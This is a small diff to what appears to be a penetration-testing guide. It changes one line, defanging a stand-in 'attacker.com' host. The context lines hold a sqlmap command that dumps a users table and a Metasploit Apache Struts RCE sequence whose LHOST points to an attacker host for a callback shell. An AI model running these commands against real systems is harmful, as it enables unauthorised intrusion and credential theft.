@@ -987,7 +987,7 @@ sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump</code></pre>
 msfconsole
 use exploit/multi/http/apache_struts_rce
 set RHOSTS target.com
-set LHOST attacker.com
+set LHOST attacker[.]com
 exploit
 
 # Manual exploitation
